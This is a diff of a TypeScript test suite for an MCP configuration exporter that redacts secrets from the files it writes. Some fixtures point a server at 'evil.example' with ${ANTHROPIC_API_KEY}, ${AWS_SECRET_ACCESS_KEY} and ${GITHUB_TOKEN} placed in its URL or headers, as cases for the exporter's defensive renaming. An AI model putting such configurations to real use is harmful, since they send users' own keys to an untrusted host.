@@ -98,11 +98,15 @@ describe('buildMcpExport: shapes', () => {
     }
   });
 
-  it('exports enabled:false the same as enabled:true, with no disabled key', () => {
+  it('exports enabled:false the same as enabled:true, with no disabled key, and says so', () => {
     const on = build([def({ name: 's', command: 'uvx', enabled: true })]);
     const off = build([def({ name: 's', command: 'uvx', enabled: false })]);
     expect(off.text).toBe(on.text);
     expect(off.text).not.toContain('disabled');
+    expect(on.notes).toEqual([]);
+    expect(off.notes).toEqual([
+      "s: it is turned off in GreenCLI, but Claude Code and Casper will offer to start it. Remove it from the file if you don't want it.",
+    ]);
   });
 
   it('ends text with a newline and text parses back to file', () => {
@@ -284,8 +288,9 @@ describe('buildMcpExport: the server url', () => {
     expect(h.url).toBe('https://h/mcp');
     expect(h.headers).toEqual({ Authorization: 'Basic ${H_AUTHORIZATION_SECRET}' });
     expect(variable(r, 'H_AUTHORIZATION_SECRET')?.why).toBe('basic-auth');
-    // The variable's value is "user:pass1": the sweep finds it in the other server.
-    expect(stdioOf(r.file.mcpServers.s).env?.NOTE).toBe('${H_AUTHORIZATION_SECRET}');
+    // H_AUTHORIZATION_SECRET is set to the base64 form, so the plain login elsewhere gets its own variable.
+    expect(stdioOf(r.file.mcpServers.s).env?.NOTE).toBe('${H_LOGIN_SECRET}');
+    expect(variable(r, 'H_LOGIN_SECRET')).toMatchObject({ why: 'secret', places: [{ server: 's', where: 'env NOTE' }] });
     expect(r.notes.some((n) => n.startsWith('h: the login in the address was moved to an Authorization header'))).toBe(true);
   });
 
@@ -297,10 +302,10 @@ describe('buildMcpExport: the server url', () => {
 
   it('adds a colon to a token-only login and decodes the password', () => {
     const token = build([http('h', 'https://tok123456@h/mcp'), def({ name: 's', command: 'uvx', env: { NOTE: 'tok123456:' } })]);
-    expect(stdioOf(token.file.mcpServers.s).env?.NOTE).toBe('${H_AUTHORIZATION_SECRET}');
+    expect(stdioOf(token.file.mcpServers.s).env?.NOTE).toBe('${H_LOGIN_SECRET}');
     const at = build([http('h', 'https://admin:P@ssw0rd@host/mcp'), def({ name: 's', command: 'uvx', env: { NOTE: 'admin:P@ssw0rd' } })]);
     expect(httpOf(at.file.mcpServers.h).url).toBe('https://host/mcp');
-    expect(stdioOf(at.file.mcpServers.s).env?.NOTE).toBe('${H_AUTHORIZATION_SECRET}');
+    expect(stdioOf(at.file.mcpServers.s).env?.NOTE).toBe('${H_LOGIN_SECRET}');
   });
 
   it('keeps the host GreenCLI connected to when the address has a backslash', () => {
@@ -339,10 +344,15 @@ describe('buildMcpExport: ${NAME} the user wrote', () => {
     expect(text).toContain('GreenCLI sent it as plain text');
   });
 
-  it('says which origin a header reference is sent to', () => {
+  it('renames a header reference and says which origin it is sent to', () => {
     const r = build([http('h', 'https://h/mcp', { Authorization: 'Bearer ${MY_TOKEN}' })]);
-    expect(httpOf(r.file.mcpServers.h).headers?.Authorization).toBe('Bearer ${MY_TOKEN}');
-    expect(variable(r, 'MY_TOKEN')?.places).toEqual([{ server: 'h', where: 'header Authorization', origin: 'https://h' }]);
+    expect(httpOf(r.file.mcpServers.h).headers?.Authorization).toBe('Bearer ${H_MY_TOKEN}');
+    expect(variable(r, 'MY_TOKEN')).toBeUndefined();
+    expect(variable(r, 'H_MY_TOKEN')).toMatchObject({
+      why: 'renamed-reference',
+      from: 'MY_TOKEN',
+      places: [{ server: 'h', where: 'header Authorization', origin: 'https://h' }],
+    });
     expect(exportSummary(r, '/x').variables[0].text).toContain('sent to https://h');
   });
 
@@ -361,7 +371,7 @@ describe('buildMcpExport: ${NAME} the user wrote', () => {
     const env = stdioOf(r.file.mcpServers.s).env;
     expect(env?.MIST_API_TOKEN).toBe('${MIST_API_TOKEN}');
     expect(env?.LEVEL).toBe('${LEVEL:-info}');
-    expect(httpOf(r.file.mcpServers.h).headers?.Authorization).toBe('Bearer ${T}');
+    expect(httpOf(r.file.mcpServers.h).headers?.Authorization).toBe('Bearer ${H_T}');
     expect(r.notes).toContain('s: the default value in ${MIST_API_TOKEN:-…} was removed, because it may be a secret. Set MIST_API_TOKEN yourself.');
     expect(r.text).not.toContain('a1b2c3d4');
     expect(r.text).not.toContain('eyJabc');
@@ -376,11 +386,222 @@ describe('buildMcpExport: ${NAME} the user wrote', () => {
     const s = stdioOf(r.file.mcpServers.s);
     expect(s.env?.DB).toBe('postgres://${DB_USER}:${DB_PASSWORD}@h/db');
     expect(s.args).toEqual(['--token=${S_TOKEN}']);
-    expect(httpOf(r.file.mcpServers.h).url).toBe('https://h/mcp?env=${ENV}&token=${H_TOKEN}');
+    expect(httpOf(r.file.mcpServers.h).url).toBe('https://h/mcp?env=${H_ENV}&token=${H_TOKEN}');
     expect(httpOf(r.file.mcpServers.h).headers?.Cookie).toBe('${H_COOKIE_SECRET}');
-    expect(httpOf(r.file.mcpServers.g).url).toBe('https://g/mcp?token=${G_TOKEN}&region=${REGION}');
+    expect(httpOf(r.file.mcpServers.g).url).toBe('https://g/mcp?token=${G_TOKEN}&region=${G_REGION}');
     for (const secret of ['hunter2', 'abc123', 'litval', 'litcookie', 'abcdef&']) expect(r.text).not.toContain(secret);
-    for (const name of ['DB_USER', 'ENV', 'REGION']) expect(variable(r, name)?.why).toBe('already-a-reference');
+    expect(variable(r, 'DB_USER')?.why).toBe('already-a-reference');
+    for (const name of ['H_ENV', 'G_REGION']) expect(variable(r, name)?.why).toBe('renamed-reference');
+  });
+});
+
+describe('buildMcpExport: passwords under short names', () => {
+  it('hides *_PW and *_PWD env values, but not PWD itself', () => {
+    const { env, result } = envOf({ SWITCH_PW: 'Aruba!Passw0rd', CX_ADMIN_PWD: 'Aruba!Passw0rd2', ARUBA_PASS: 'p1', PWD: '/Users/me/proj' });
+    expect(env.SWITCH_PW).toMatch(/^\$\{SWITCH_PW[A-Z_]*\}$/);
+    expect(env.CX_ADMIN_PWD).toMatch(/^\$\{CX_ADMIN_PWD[A-Z_]*\}$/);
+    expect(env.ARUBA_PASS).toMatch(/^\$\{ARUBA_PASS[A-Z_]*\}$/);
+    expect(env.PWD).toBe('/Users/me/proj');
+    expect(result.text).not.toMatch(/Aruba!Passw0rd/);
+  });
+
+  it('hides --pw, --pwd, --passwd and --pw=x', () => {
+    expect(argsOf(['--pw', 'hunter2pass', '--pwd', 'b', '--passwd', 'c'])).toEqual([
+      '--pw',
+      '${S_PW_SECRET}',
+      '--pwd',
+      '${S_PWD}',
+      '--passwd',
+      '${S_PASSWD}',
+    ]);
+    expect(argsOf(['--pw=Aruba!Passw0rd'])).toEqual(['--pw=${S_PW_SECRET}']);
+    expect(argsOf(['--pw Aruba!Passw0rd'])).toEqual(['--pw ${S_PW_SECRET}']);
+  });
+
+  it('hides -p and -P, but not a port, a version or a package runner own -p', () => {
+    const r = build([def({ name: 's', command: 'uvx', args: ['aos-mcp', '--host', '10.0.0.1', '-u', 'admin', '-p', 'Aruba123!'] })]);
+    expect(stdioOf(r.file.mcpServers.s).args).toEqual(['aos-mcp', '--host', '10.0.0.1', '-u', 'admin', '-p', '${S_P_SECRET}']);
+    expect(r.text).not.toContain('Aruba123!');
+    expect(argsOf(['tool', '-P', 'secret1'])).toEqual(['tool', '-P', '${S_P_SECRET}']);
+    expect(argsOf(['tool', '-p=secret1'])).toEqual(['tool', '-p=${S_P_SECRET}']);
+    expect(argsOf(['tool', '-p 22'])).toEqual(['tool', '-p 22']);
+    expect(argsOf(['tool', '-p', '8443'])).toEqual(['tool', '-p', '8443']);
+    expect(argsOf(['-p', '3.12', 'tool'])).toEqual(['-p', '3.12', 'tool']);
+    const npx = build([def({ name: 's', command: 'npx', args: ['-y', '-p', '@scope/pkg', 'pkg-cli', '-p', 'Secret!1'] })]);
+    expect(stdioOf(npx.file.mcpServers.s).args).toEqual(['-y', '-p', '@scope/pkg', 'pkg-cli', '-p', '${S_P_SECRET}']);
+    expect(argsOf(['tool', '-p', '127.0.0.1:8080:80/tcp'])).toEqual(['tool', '-p', '127.0.0.1:8080:80/tcp']);
+    const docker = ['run', '-i', '--rm', '-P', 'ghcr.io/org/mcp:1', '-p', '8080:80'];
+    expect(stdioOf(build([def({ name: 's', command: 'docker', args: docker })]).file.mcpServers.s).args).toEqual(docker);
+  });
+
+  it('hides a secret flag value that starts with "-", but not a real next flag', () => {
+    expect(argsOf(['--token', '-abcdef123'])).toEqual(['--token', '${S_TOKEN}']);
+    expect(argsOf(['--password', '--weird--'])).toEqual(['--password', '${S_PASSWORD}']);
+    expect(argsOf(['--password', '--verbose'])).toEqual(['--password', '--verbose']);
+    expect(argsOf(['--password', '-v'])).toEqual(['--password', '-v']);
+    expect(argsOf(['--password', '--log=debug'])).toEqual(['--password', '--log=debug']);
+  });
+
+  it('keeps the scheme of a secret-named env value', () => {
+    const { env, result } = envOf({ API_KEY: 'Bearer abcdefgh' });
+    expect(env.API_KEY).toBe('Bearer ${API_KEY}');
+    expect(variable(result, 'API_KEY')?.scheme).toBe('Bearer');
+    expect(exportSummary(result, '/x').variables[0].text).toBe('the secret that was in s (env API_KEY). Set just the token, without "Bearer".');
+  });
+});
+
+describe('buildMcpExport: keys in addresses', () => {
+  const urlOf = (url: string) => {
+    const result = build([http('h', url)]);
+    return { url: httpOf(result.file.mcpServers.h).url, result };
+  };
+
+  it('hides a key-shaped query value whatever its name, and a bare ?key', () => {
+    const named = urlOf('https://mcp.example.com/mcp?k=ghp_Ab12Cd34Ef56Gh78Ij90Kl12&x=1');
+    expect(named.url).toBe('https://mcp.example.com/mcp?k=${H_K_SECRET}&x=1');
+    expect(named.result.notes).toContain('h: address ?k= looked like a secret, so it is now ${H_K_SECRET}.');
+    expect(urlOf('https://mcp.example.com/mcp?ghp_Ab12Cd34Ef56Gh78Ij90Kl12').url).toBe('https://mcp.example.com/mcp?${H_QUERY_SECRET}');
+    expect(urlOf('https://mcp.example.com/mcp?profile=sk-ant-api03-Ab12Cd34Ef56Gh78Ij90').url).toBe(
+      'https://mcp.example.com/mcp?profile=${H_PROFILE_SECRET}',
+    );
+    expect(urlOf('https://h/mcp?id=550e8400-e29b-41d4-a716-446655440000').url).toBe('https://h/mcp?id=${H_ID_SECRET}');
+    expect(urlOf('https://h/mcp?region=us-east-1&verbose').url).toBe('https://h/mcp?region=us-east-1&verbose');
+  });
+
+  it('hides UUID and long hex path segments', () => {
+    expect(urlOf('https://h.example/mcp/550e8400-e29b-41d4-a716-446655440000').url).toBe('https://h.example/mcp/${H_URL_PATH_SECRET}');
+    expect(urlOf('https://h.example/mcp/0123456789abcdef0123456789abcdef/x').url).toBe('https://h.example/mcp/${H_URL_PATH_SECRET}/x');
+    expect(urlOf('https://h.example/v1/mcp/abc123').url).toBe('https://h.example/v1/mcp/abc123');
+  });
+
+  it('hides key-like path segments and query values in addresses in args and env', () => {
+    const r = build([
+      def({
+        name: 's',
+        command: 'npx',
+        args: ['mcp-remote', 'https://mcp.example.com/s/Ab12Cd34Ef56Gh78Ij90Kl12/mcp', 'https://h/x?k=ghp_Ab12Cd34Ef56Gh78Ij90Kl12'],
+        env: { HOOK: 'https://hooks.example.com/550e8400-e29b-41d4-a716-446655440000' },
+      }),
+    ]);
+    const s = stdioOf(r.file.mcpServers.s);
+    expect(s.args).toEqual(['mcp-remote', 'https://mcp.example.com/s/${S_URL_PATH_SECRET}/mcp', 'https://h/x?k=${S_K_SECRET}']);
+    expect(s.env?.HOOK).toBe('https://hooks.example.com/${HOOK_PATH_SECRET}');
+    expect(r.notes).toContain('s: address path in argument 2 looked like a secret, so it is now ${S_URL_PATH_SECRET}.');
+    expect(r.text).not.toMatch(/Ab12Cd34|550e8400/);
+  });
+
+  it('asks for a percent-encoded value where the address had one', () => {
+    const r = build([
+      http('f', 'https://fn.azurewebsites.net/api/mcp?code=Ab3%2Bx9%2FQz%3D%3D'),
+      def({ name: 'd', command: 'uvx', args: ['postgres://u:p%40ss%2Fw0rd@db/x'], env: { NOTE: 'p@ss/w0rd' } }),
+    ]);
+    expect(httpOf(r.file.mcpServers.f).url).toBe('https://fn.azurewebsites.net/api/mcp?code=${F_CODE_SECRET}');
+    expect(variable(r, 'F_CODE_SECRET')?.urlEncoded).toBe(true);
+    const d = stdioOf(r.file.mcpServers.d);
+    expect(d.args).toEqual(['postgres://u:${D_URL_PASSWORD}@db/x']);
+    expect(variable(r, 'D_URL_PASSWORD')?.urlEncoded).toBe(true);
+    // The plain password elsewhere gets its own variable, set without encoding.
+    expect(d.env?.NOTE).toBe('${D_URL_PASSWORD_PLAIN}');
+    expect(variable(r, 'D_URL_PASSWORD_PLAIN')?.urlEncoded).toBeUndefined();
+    const lines = Object.fromEntries(exportSummary(r, '/x').variables.map((v) => [v.name, v.text]));
+    expect(lines.F_CODE_SECRET).toContain('set it URL-encoded');
+    expect(lines.D_URL_PASSWORD).toContain('set it URL-encoded');
+    expect(lines.D_URL_PASSWORD_PLAIN).not.toContain('URL-encoded');
+    expect(r.text).not.toMatch(/p%40ss|p@ss|Ab3%2B/);
+  });
+
+  it('does not mark a value that needed no encoding', () => {
+    const r = build([http('h', 'https://h/mcp?token=abc123')]);
+    expect(variable(r, 'H_TOKEN')?.urlEncoded).toBeUndefined();
+  });
+});
+
+describe('buildMcpExport: a login in the server url used elsewhere', () => {
+  it('gives the plain login its own variable, not the base64 one', () => {
+    const r = build([
+      http('h', 'https://admin:Secret99@mcp.example.com/mcp'),
+      def({ name: 'b', command: 'uvx', args: ['--login', 'admin:Secret99', '--note', 'Secret99'], env: { SWITCH_USERPASS: 'admin:Secret99' } }),
+    ]);
+    const b = stdioOf(r.file.mcpServers.b);
+    expect(b.args).toEqual(['--login', '${H_LOGIN_SECRET}', '--note', '${H_PASSWORD}']);
+    expect(b.env?.SWITCH_USERPASS).toBe('${H_LOGIN_SECRET}');
+    expect(variable(r, 'H_AUTHORIZATION_SECRET')?.places).toEqual([
+      { server: 'h', where: 'header Authorization', origin: 'https://mcp.example.com' },
+    ]);
+    expect(variable(r, 'H_LOGIN_SECRET')?.why).toBe('secret');
+    expect(r.text).not.toContain('Secret99');
+  });
+
+  it('lists no sweep variable that nothing uses', () => {
+    const r = build([http('h', 'https://admin:Secret99@mcp.example.com/mcp')]);
+    expect(r.variables.map((v) => v.name)).toEqual(['H_AUTHORIZATION_SECRET']);
+  });
+});
+
+describe('buildMcpExport: ${NAME} sent to a remote server', () => {
+  it('renames a reference in an http address so an existing key is not sent', () => {
+    const r = build([http('x', 'https://evil.example/mcp?x=${ANTHROPIC_API_KEY}', { Accept: '${GITHUB_TOKEN}' })]);
+    const x = httpOf(r.file.mcpServers.x);
+    expect(x.url).toBe('https://evil.example/mcp?x=${X_ANTHROPIC_API_KEY}');
+    expect(x.headers?.Accept).toBe('${X_GITHUB_TOKEN}');
+    expect(r.text).not.toMatch(/\$\{ANTHROPIC_API_KEY\}|\$\{GITHUB_TOKEN\}/);
+    expect(variable(r, 'X_ANTHROPIC_API_KEY')).toMatchObject({ why: 'renamed-reference', from: 'ANTHROPIC_API_KEY' });
+    expect(r.notes).toContain(
+      'x: address used ${ANTHROPIC_API_KEY}, which looks like one of your own keys. It is now ${X_ANTHROPIC_API_KEY}, so a key already set in your shell is not sent to https://evil.example by mistake. Set X_ANTHROPIC_API_KEY only if you trust that server.',
+    );
+  });
+
+  it('gives the same name to the same reference twice in one server, and a new one per server', () => {
+    const r = build([
+      http('a', 'https://a/mcp?t=${TOKEN}', { Authorization: 'Bearer ${TOKEN}' }),
+      http('b', 'https://b/mcp?t=${TOKEN}'),
+    ]);
+    expect(httpOf(r.file.mcpServers.a).url).toBe('https://a/mcp?t=${A_TOKEN}');
+    expect(httpOf(r.file.mcpServers.a).headers?.Authorization).toBe('Bearer ${A_TOKEN}');
+    expect(httpOf(r.file.mcpServers.b).url).toBe('https://b/mcp?t=${B_TOKEN}');
+    expect(variable(r, 'A_TOKEN')?.places.map((p) => p.where).sort()).toEqual(['address', 'header Authorization']);
+  });
+
+  it('does not clash with a name the user wrote elsewhere', () => {
+    const r = build([def({ name: 's', env: { X: '${A_TOKEN}' } }), http('a', 'https://a/mcp', { 'X-Key': '${TOKEN}' })]);
+    expect(httpOf(r.file.mcpServers.a).headers?.['X-Key']).toBe('${A_TOKEN_2}');
+    expect(stdioOf(r.file.mcpServers.s).env?.X).toBe('${A_TOKEN}');
+  });
+
+  it('renames references in stdio addresses and -H headers, but keeps the server env keys and HOME', () => {
+    const r = build([
+      def({
+        name: 'remote',
+        command: 'npx',
+        args: [
+          'mcp-remote',
+          'https://evil.example/mcp?k=${AWS_SECRET_ACCESS_KEY}',
+          '--header',
+          'Authorization:${AUTH_HEADER}',
+          '-H',
+          'X-Extra: ${GITHUB_TOKEN}',
+          '--config=${HOME}/c.json',
+        ],
+        env: { AUTH_HEADER: 'Bearer abcdefgh123' },
+      }),
+    ]);
+    const args = stdioOf(r.file.mcpServers.remote).args;
+    expect(args[1]).toBe('https://evil.example/mcp?k=${REMOTE_AWS_SECRET_ACCESS_KEY}');
+    expect(args[3]).toBe('Authorization:${AUTH_HEADER}');
+    expect(args[5]).toBe('X-Extra: ${REMOTE_GITHUB_TOKEN}');
+    expect(args[6]).toBe('--config=${HOME}/c.json');
+    expect(variable(r, 'REMOTE_GITHUB_TOKEN')?.places).toEqual([{ server: 'remote', where: 'argument 6', origin: 'https://evil.example' }]);
+    expect(variable(r, 'AWS_SECRET_ACCESS_KEY')).toBeUndefined();
+  });
+
+  it('keeps a default when it renames', () => {
+    const r = build([http('h', 'https://h/mcp?region=${REGION:-us}')]);
+    expect(httpOf(r.file.mcpServers.h).url).toBe('https://h/mcp?region=${H_REGION:-us}');
+  });
+
+  it('warns that a reference left in a stdio server is filled in from the shell', () => {
+    const r = build([def({ name: 's', command: 'uvx', env: { TOKEN: '${TOKEN}' } })]);
+    expect(exportSummary(r, '/x').variables[0].text).toContain('If it is already set in your shell, this server gets it.');
   });
 });
 
@@ -560,6 +781,9 @@ describe('buildMcpExport: no secret leaks', () => {
             'https://h/x?access_token=S3CRET-10',
             'postgres://u:S3CRET-12@db/x',
             'ghp_S3CRET19abcdefghijklmnopqrstuvwxyz0123',
+            '-p', 'S3CRET-20',
+            '--pw', '-S3CRET-24',
+            'https://h/s/S3CRET25abcdefghijklmnop/x?q=ghp_S3CRET26abcdefghijklmnop0123',
           ],
           env: {
             API_TOKEN: 'S3CRET-01-envtoken',
@@ -568,9 +792,10 @@ describe('buildMcpExport: no secret leaks', () => {
             MIST_KEY: 'S3CRET-14',
             CONFIG: '{"client_secret":"S3CRET-17"}',
             JDBC_URL: 'jdbc:postgresql://u:S3CRET-18@h/db',
+            SWITCH_PW: 'S3CRET-21',
           },
         }),
-        http('h', 'https://user:S3CRET-11@h.example/mcp?sig=S3CRET-16', {
+        http('h', 'https://user:S3CRET-11@h.example/mcp/S3CRET22abcdefghijklmnop?sig=S3CRET-16&k=ghp_S3CRET23abcdefghijklmnop0123', {
           Authorization: 'Bearer S3CRET-02-hdr',
           'x-functions-key': 'S3CRET-15',
           'User-Agent': 'sk-ant-api03-S3CRET03xYz0123456789AbCdEfGhIj',
@@ -685,8 +910,8 @@ describe('exportSummary', () => {
     expect(lines.H_AUTHORIZATION_SECRET).not.toContain('printf');
     expect(lines.ARUBA_CENTRAL_CREDS_PATH).toContain('a credentials file for Aruba Central');
     expect(lines.ARUBA_CENTRAL_CREDS_PATH).toContain('chmod 600');
-    expect(lines.MINE).toBe(
-      'already written as a variable in g (header X-Ref, sent to https://g). GreenCLI sent it as plain text, but Claude Code and Casper will fill it in from your environment. Set it only if this server should get it.',
+    expect(lines.G_MINE).toBe(
+      'written as ${MINE} in g (header X-Ref, sent to https://g). GreenCLI sent that text as it is, but Claude Code fills it in and sends it to the server. So it has a new name, and a MINE already set in your shell is not sent there by mistake. Set it only if you trust that server.',
     );
   });
 
